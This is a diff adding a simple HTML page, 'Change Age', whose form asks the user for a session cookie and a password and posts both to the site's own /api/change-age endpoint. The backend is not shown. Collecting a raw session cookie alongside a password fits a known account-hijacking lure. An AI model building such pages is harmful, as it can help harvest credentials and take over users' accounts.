@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Change Age</title>
+</head>
+<body>
+  <h1>Change Age</h1>
+  <form id="change-age-form">
+    <div>
+      <label for="cookie">Cookie:</label>
+      <input type="text" id="cookie" name="cookie" required>
+    </div>
+    <div>
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" required>
+    </div>
+    <button type="submit">Change Age</button>
+  </form>
+
+  <script>
+    document.getElementById('change-age-form').addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      const cookie = document.getElementById('cookie').value;
+      const password = document.getElementById('password').value;
+
+      const response = await fetch('/api/change-age', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ cookie, password })
+      });
+
+      const result = await response.json();
+      alert(result.message || result.error);
+    });
+  </script>
+</body>
+</html>
